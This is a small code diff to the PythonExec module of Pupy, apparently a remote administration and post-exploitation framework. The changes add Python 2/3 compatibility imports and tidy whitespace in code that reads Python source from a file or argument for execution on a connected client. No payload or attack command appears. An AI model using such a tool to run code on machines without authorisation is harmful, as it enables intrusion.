@@ -2,6 +2,13 @@
 # Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
 # Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
 
+from __future__ import absolute_import
+from __future__ import division
+from __future__ import print_function
+from __future__ import unicode_literals
+
+from io import open
+
 from pupylib.PupyModule import (
     config, PupyModule, PupyArgumentParser,
     REQUIRE_STREAM
@@ -12,6 +19,7 @@ from pupylib.PupyCompleter import path_completer
 from pupylib.utils.rpyc_utils import redirected_stdio
 
 __class_name__="PythonExec"
+
 
 @config(cat="admin")
 class PythonExec(PupyModule):
@@ -31,9 +39,9 @@ class PythonExec(PupyModule):
         if args.file:
             self.info("loading code from %s ..."%args.file)
             with open(args.file,'r') as f:
-                code=f.read()
+                code = f.read()
         elif args.code:
-            code=args.code
+            code = args.code
         else:
             raise PupyModuleError("--code or --file argument is mandatory")
 
